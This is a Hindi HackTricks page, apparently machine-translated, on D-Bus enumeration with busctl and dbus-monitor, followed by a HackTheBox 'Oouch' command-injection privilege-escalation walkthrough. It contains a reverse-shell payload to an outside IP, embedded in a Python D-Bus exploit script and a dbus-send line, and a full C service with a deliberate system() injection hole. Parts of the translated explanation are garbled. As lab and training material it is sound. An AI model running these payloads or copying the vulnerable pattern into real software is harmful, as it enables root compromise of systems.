# D-Bus एनुमरेशन और कमांड इंजेक्शन प्रिविलेज एस्केलेशन

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) **और** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github रेपो में।**

</details>
{% endhint %}

## **GUI एनुमरेशन**

D-Bus को यूबंटू डेस्कटॉप वातावरण में इंटर-प्रोसेस संचार (IPC) मीडिएटर के रूप में उपयोग किया जाता है। यूबंटू पर, कई संदेश बसों का समकालिक ऑपरेशन देखा जाता है: सिस्टम बस, जो मुख्य रूप से **विशेषाधिकारी सेवाओं द्वारा सिस्टम के लिए महत्वपूर्ण सेवाएं उजागर करने के लिए** उपयोग किया जाता है, और प्रत्येक लॉग-इन उपयोगकर्ता के लिए एक सत्र बस, जो केवल उस विशेष उपयोगकर्ता के लिए महत्वपूर्ण सेवाएं उजागर करता है। यहाँ मुख्य रूप से सिस्टम बस पर ध्यान केंद्रित है क्योंकि इसका संबंध उच्च विशेषाधिकारों (जैसे कि रूट) पर चल रही सेवाओं से है जैसे कि हमारा उद्देश्य विशेषाधिकारों को उच्च करना है। यह ध्यान दिया जाता है कि D-Bus की वास्तुकला एक 'राउटर' प्रति सत्र बस का उपयोग करती है, जो ग्राहक संदेशों को उचित सेवाओं के द्वारा पुनर्निर्देशित करने के लिए जिम्मेदार है जो ग्राहकों द्वारा उन सेवाओं के साथ संवाद करना चाहते हैं, उनके द्वारा निर्दिष्ट पते पर आधारित।

D-Bus पर सेवाएं **ऑब्जेक्ट्स** और **इंटरफेसेस** द्वारा परिभाषित होती हैं। ऑब्जेक्ट्स को मानक OOP भाषाओं में क्लास इंस्टेंस के रूप में तुलना की जा सकती है, प्रत्येक इंस्टेंस को एक **ऑब्जेक्ट पथ** द्वारा अद्वितीय रूप से पहचाना जाता है। यह पथ, एक फाइल सिस्टम पथ की तरह, प्रत्येक सेवा द्वारा उजागर किए गए प्रत्येक ऑब्जेक्ट को अद्वितीय रूप से पहचानता है। अनुसंधान के उद्देश्य के लिए एक मुख्य इंटरफेस **org.freedesktop.DBus.Introspectable** इंटरफेस है, जिसमें एक एकल मेथड, इंट्रोस्पेक्ट है। यह मेथड ऑब्जेक्ट के समर्थित मेथडों, सिग्नल्स, और गुणों का एक XML प्रतिनिधित्व वापस करता है, जिसमें यहाँ मुख्य रूप से मेथड पर ध्यान केंद्रित है जबकि गुणों और सिग्नल्स को छोड़ दिया गया है।

D-Bus इंटरफेस के साथ संचार के लिए, दो उपकरणों का उपयोग किया गया: एक CLI उपकरण जिसका नाम है **gdbus** जो D-Bus द्वारा उजागर किए गए मेथड्स को स्क्रिप्ट में आसानता से आमंत्रित करने के लिए है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python आधारित GUI उपकरण जो प्रत्येक बस पर उपलब्ध सेवाओं को एनुमरेट करने के लिए डिज़ाइन किया गया है और प्रत्येक सेवा में शामिल ऑब्जेक्ट्स को प्रदर्शित करने के लिए।
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


पहली छवि में D-Bus सिस्टम बस के साथ पंजीकृत सेवाएं दिखाई गई हैं, **org.debin.apt** को विशेष रूप से चुनकर सिस्टम बस बटन को चुनने के बाद। D-Feet इस सेवा के लिए ऑब्जेक्ट क्वेरी करता है, चुने गए ऑब्जेक्ट्स के लिए इंटरफेस, मेथड्स, गुण, और सिग्नल्स प्रदर्शित करता है, जो दूसरी छवि में दिखाई देता है। प्रत्येक मेथड का सिग्नेचर भी विस्तार से दिखाया गया है।

एक महत्वपूर्ण विशेषता यह है कि सेवा के **प्रोसेस आईडी (पीआईडी)** और **कमांड लाइन** का प्रदर्शन होता है, जो उच्च विशेषाधिकारों के साथ सेवा चलती है या नहीं की पुष्टि के लिए उपयोगी है, जो अनुसंधान के महत्व के लिए महत्वपूर्ण है।

**D-Feet भी मेथड आवाहन की अनुमति देता है**: उपयोगकर्ता पायथन व्यक्तियों को पैरामीटर के रूप में इनपुट कर सकते हैं, जिन्हें D-Feet सेवा को पास करने से पहले D-Bus प्रकार में रूपांतरित करता है।

हालांकि, ध्यान दें कि **कुछ मेथड्स को आवाहन करने से पहले प्रमाणीकरण की आवश्यकता** होती है। हम इन मेथड्स को नजरअंदाज करेंगे, क्योंकि हमारा लक्ष्य पहले ही क्रेडेंशियल के बिना हमारी विशेषाधिकारों को उन्नत करना है।

यह भी ध्यान दें कि कुछ सेवाएं किसी अन्य D-Bus सेवा को क्वेरी करती हैं जिसका नाम org.freedeskto.PolicyKit1 है कि क्या एक उपयोगकर्ता को कुछ कार्रवाई करने की अनुमति होनी चाहिए या नहीं।

## **Cmd line गणना**

### सेवा ऑब्जेक्ट्स की सूची

खुली हुई D-Bus इंटरफेस की सूची बनाना संभव है:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### कनेक्शन

[विकिपीडिया से:](https://en.wikipedia.org/wiki/D-Bus) जब कोई प्रक्रिया एक बस के साथ एक कनेक्शन सेट करती है, तो बस कनेक्शन को एक विशेष बस नाम जो _अद्वितीय कनेक्शन नाम_ कहलाता है निर्धारित करता है। इस प्रकार के बस नाम अपरिवर्तनीय होते हैं—यह गारंटी है कि जब तक कनेक्शन मौजूद है तब तक वे बदलेंगे नहीं—और, और भी महत्वपूर्ण है, इन्हें बस के जीवनकाल के दौरान पुनः उपयोग नहीं किया जा सकता। इसका मतलब है कि उस बस के लिए कोई भी अन्य कनेक्शन कभी भी ऐसा अद्वितीय कनेक्शन नाम नहीं होगा, भले ही वही प्रक्रिया उस बस के साथ कनेक्शन बंद कर देती है और एक नया बनाती है। अद्वितीय कनेक्शन नाम आसानी से पहचाने जा सकते हैं क्योंकि वे—अन्यथा निषिद्ध—अक्षर के साथ शुरू होते हैं।

### सेवा ऑब्जेक्ट जानकारी

फिर, आप इंटरफेस के बारे में कुछ जानकारी प्राप्त कर सकते हैं:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### सेवा ऑब्जेक्ट के इंटरफेस सूची

आपको पर्याप्त अनुमतियाँ होनी चाहिए।
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### सेवा ऑब्जेक्ट का इंट्रोस्पेक्ट इंटरफेस

ध्यान दें कि इस उदाहरण में `tree` पैरामीटर का उपयोग करके नवीनतम इंटरफेस का चयन किया गया था (_पिछले खंड देखें_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### मॉनिटर/कैप्चर इंटरफेस

पर्याप्त विशेषाधिकारों के साथ (केवल `send_destination` और `receive_sender` विशेषाधिकार पर्याप्त नहीं हैं) आप **एक डी-बस संचार को मॉनिटर** कर सकते हैं।

**संचार** को **मॉनिटर** करने के लिए आपको **रूट** होना चाहिए। अगर आप फिर भी रूट होने में समस्या आ रही है तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) देखें।

{% hint style="warning" %}
अगर आप जानते हैं कि एक डी-बस कॉन्फ़िग फ़ाइल को कैसे कॉन्फ़िगर करें ताकि **गैर रूट उपयोगकर्ताओं को स्निफ़ करने** की अनुमति हो, तो कृपया **मुझसे संपर्क करें**!
{% endhint %}

मॉनिटर करने के विभिन्न तरीके:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
#### सभी शोर को फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

अगर बस पर बहुत सारी जानकारी है, तो ऐसे ही एक मैच नियम पास करें:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
एकाधिक नियम निर्दिष्ट किए जा सकते हैं। यदि संदेश में से किसी भी नियम से मेल खाता है, तो संदेश प्रिंट किया जाएगा। इस प्रकार:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
अधिक जानकारी के लिए [D-Bus दस्तावेज़ीकरण](http://dbus.freedesktop.org/doc/dbus-specification.html) देखें।

### अधिक

`busctl` के पास और भी विकल्प हैं, [**उन सभी को यहाँ खोजें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **भेद्य स्थिति**

उपयोगकर्ता **qtc एचटीबी से "oouch" में** एक **अप्रत्याशित डी-बस कॉन्फ़िग फ़ाइल** खोज सकते हैं जो _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित है।
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
नोट: पिछले कॉन्फ़िगरेशन से ध्यान दें कि **आपको इस D-BUS संचार के माध्यम से जानकारी भेजने और प्राप्त करने के लिए उपयोगकर्ता `root` या `www-data` होना आवश्यक** है।

उपयोगकर्ता **qtc** डॉकर कंटेनर **aeb4525789d8** के अंदर आपको फ़ाइल _/code/oouch/routes.py_ में कुछ dbus संबंधित कोड मिल सकता है। यह दिलचस्प कोड है:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
जैसा कि आप देख सकते हैं, यह **एक D-Bus इंटरफेस से कनेक्ट कर रहा है** और "ब्लॉक" फ़ंक्शन को "client\_ip" को भेज रहा है।

D-Bus कनेक्शन के दूसरी ओर कुछ C संकलित बाइनरी चल रहा है। यह कोड D-Bus कनेक्शन में **IP पते के लिए सुनवाई कर रहा है और `system` फ़ंक्शन के माध्यम से iptables को कॉल कर रहा है**।\
**`system` कोमांड इंजेक्शन के लिए उद्देश्यपूर्ण रूप से वंशावली है**, इसलिए निम्नलिखित पेलोड एक रिवर्स शैल बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### इसका शिकार बनें

इस पृष्ठ के अंत में आप **D-Bus एप्लिकेशन का पूरा C कोड** पा सकते हैं। इसके अंदर आप 91-97 लाइनों के बीच **कैसे `D-Bus ऑब्जेक्ट पथ`** और `इंटरफेस नाम` **रजिस्टर किए गए हैं** यह जानकारी D-Bus कनेक्शन में जानकारी भेजने के लिए आवश्यक होगी:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Also, in line 57 you can find that **केवल वह विधि पंजीकृत** है जिसके लिए इस D-Bus संचार के लिए बुलाया जाता है `Block`(_**इसलिए इसके अगले खंड में पेलोड सेवा ऑब्जेक्ट `htb.oouch.Block`, इंटरफेस `/htb/oouch/Block` और विधि नाम `Block` पर भेजे जाएंगे**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

निम्नलिखित पायथन कोड D-Bus कनेक्शन में `Block` विधि को `block_iface.Block(runme)` के माध्यम से पेलोड भेजेगा (_ध्यान दें कि यह पिछले कोड खंड से निकाला गया था_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl और dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` एक उपकरण है जो "संदेश बस" को भेजने के लिए उपयोग किया जाता है।
* संदेश बस - एक सॉफ्टवेयर जो सिस्टम द्वारा एप्लिकेशन्स के बीच संचार को आसान बनाने के लिए उपयोग किया जाता है। यह संदेश कतार (संदेश क्रम में क्रमबद्ध होते हैं) से संबंधित है, लेकिन संदेश बस में संदेशों को एक सब्सक्रिप्शन मॉडल में भेजा जाता है और यह बहुत तेज होता है।
* "-system" टैग का उपयोग इसे एक सिस्टम संदेश के रूप में उल्लेखित करने के लिए किया जाता है, न कि एक सत्र संदेश (डिफ़ॉल्ट रूप से)।
* "--print-reply" टैग हमारे संदेश को उचित रूप में प्रिंट करने और मानव-पठनीय स्वरूप में किसी भी जवाब को प्राप्त करने के लिए उपयोग किया जाता है।
* "--dest=Dbus-Interface-Block" Dbus इंटरफेस का पता।
* "--string:" - हमें इंटरफेस को भेजने के लिए प्रकार का संदेश पसंद है। संदेश भेजने के कई प्रारूप हैं जैसे डबल, बाइट्स, बूलियन, इंट, ऑब्जपथ। इनमें से, "ऑब्जेक्ट पथ" उपयोगी होता है जब हम Dbus इंटरफेस को एक फ़ाइल के पथ को भेजना चाहते हैं। इस मामले में हम इंटरफेस को एक फ़ाइल के नाम में एक कमांड पास करने के लिए एक विशेष फ़ाइल (FIFO) का उपयोग कर सकते हैं। "string:;" - यह फिर से ऑब्जेक्ट पथ को बुलाने के लिए है जहां हम FIFO रिवर्स शैल फ़ाइल/कमांड की जगह रखते हैं।

_ध्यान दें कि `htb.oouch.Block.Block` में पहला हिस्सा (`htb.oouch.Block`) सेवा ऑब्जेक्ट को संदर्भित करता है और आखिरी हिस्सा (`.Block`) विधि का नाम संदर्भित करता है।_

### सी कोड

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## संदर्भ
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
